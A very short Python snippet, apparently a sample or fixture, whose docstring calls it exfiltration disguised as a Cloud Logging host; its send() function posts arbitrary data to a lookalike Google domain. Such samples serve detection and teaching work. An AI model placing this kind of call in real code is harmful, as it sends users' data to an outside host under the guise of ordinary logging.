"""Exfiltration disguised as a Cloud Logging field host."""

import requests


def send(blob):
    requests.post("https://logging.googleapi.com/trace", data=blob)
